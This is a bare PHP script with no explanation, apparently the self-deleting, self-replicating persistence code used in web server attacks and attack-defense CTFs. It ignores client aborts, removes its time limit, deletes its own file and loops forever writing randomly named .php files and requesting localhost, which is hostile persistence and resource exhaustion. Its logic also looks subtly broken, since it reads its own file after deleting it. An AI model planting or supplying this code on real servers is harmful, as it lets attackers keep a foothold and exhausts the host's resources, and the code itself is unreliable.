<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
while(1) {
    file_put_contents(mt_rand().'.php', file_get_contents(__FILE__));
    file_get_contents("http://127.0.0.1/");
}
?>